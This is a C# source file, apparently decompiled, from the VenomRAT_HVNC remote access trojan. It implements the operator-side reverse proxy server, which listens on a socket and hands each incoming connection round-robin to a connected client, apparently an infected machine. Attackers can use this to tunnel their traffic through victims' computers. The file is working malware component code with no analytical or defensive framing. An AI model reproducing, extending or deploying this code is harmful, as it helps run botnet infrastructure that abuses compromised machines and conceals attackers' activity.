using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Helper
{
    public class ReverseProxyServer
    {
        public event ReverseProxyServer.ConnectionEstablishedCallback OnConnectionEstablished;

        public event ReverseProxyServer.UpdateConnectionCallback OnUpdateConnection;

        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                List<ReverseProxyClient> clients = this._clients;
                ReverseProxyClient[] result;
                lock (clients)
                {
                    result = this._clients.ToArray();
                }
                return result;
            }
        }

        public ReverseProxyClient[] OpenConnections
        {
            get
            {
                List<ReverseProxyClient> clients = this._clients;
                ReverseProxyClient[] result;
                lock (clients)
                {
                    List<ReverseProxyClient> list = new List<ReverseProxyClient>();
                    for (int i = 0; i < this._clients.Count; i++)
                    {
                        if (this._clients[i].ProxySuccessful)
                        {
                            list.Add(this._clients[i]);
                        }
                    }
                    result = list.ToArray();
                }
                return result;
            }
        }

        public Clients[] Clients { get; private set; }

        public ReverseProxyServer()
        {
            this._clients = new List<ReverseProxyClient>();
        }

        public void StartServer(Clients[] clients, string ipAddress, ushort port)
        {
            this.Stop();
            this.Clients = clients;
            this._socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            this._socket.Bind(new IPEndPoint(IPAddress.Parse(ipAddress), (int)port));
            this._socket.Listen(100);
            this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), null);
        }

        private void AsyncAccept(IAsyncResult ar)
        {
            try
            {
                List<ReverseProxyClient> clients = this._clients;
                lock (clients)
                {
                    this._clients.Add(new ReverseProxyClient(this.Clients[(int)(checked((IntPtr)(unchecked((ulong)this._clientIndex % (ulong)((long)this.Clients.Length)))))], this._socket.EndAccept(ar), this));
                    this._clientIndex += 1U;
                }
            }
            catch
            {
            }
            try
            {
                this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), null);
            }
            catch
            {
            }
        }

        public void Stop()
        {
            if (this._socket != null)
            {
                this._socket.Close();
                this._socket = null;
            }
            List<ReverseProxyClient> clients = this._clients;
            lock (clients)
            {
                foreach (ReverseProxyClient reverseProxyClient in new List<ReverseProxyClient>(this._clients))
                {
                    reverseProxyClient.Disconnect();
                }
                this._clients.Clear();
            }
        }

        public ReverseProxyClient GetClientByConnectionId(int connectionId)
        {
            List<ReverseProxyClient> clients = this._clients;
            ReverseProxyClient result;
            lock (clients)
            {
                result = this._clients.FirstOrDefault((ReverseProxyClient t) => t.ConnectionId == connectionId);
            }
            return result;
        }

        internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
        {
            try
            {
                if (this.OnConnectionEstablished != null)
                {
                    this.OnConnectionEstablished(proxyClient);
                }
            }
            catch
            {
            }
        }

        internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
        {
            try
            {
                if (!proxyClient.IsConnected)
                {
                    List<ReverseProxyClient> clients = this._clients;
                    lock (clients)
                    {
                        for (int i = 0; i < this._clients.Count; i++)
                        {
                            if (this._clients[i].ConnectionId == proxyClient.ConnectionId)
                            {
                                this._clients.RemoveAt(i);
                                break;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            try
            {
                if (this.OnUpdateConnection != null)
                {
                    this.OnUpdateConnection(proxyClient);
                }
            }
            catch
            {
            }
        }

        private Socket _socket;

        private readonly List<ReverseProxyClient> _clients;

        private uint _clientIndex;

        public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

        public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);
    }
}
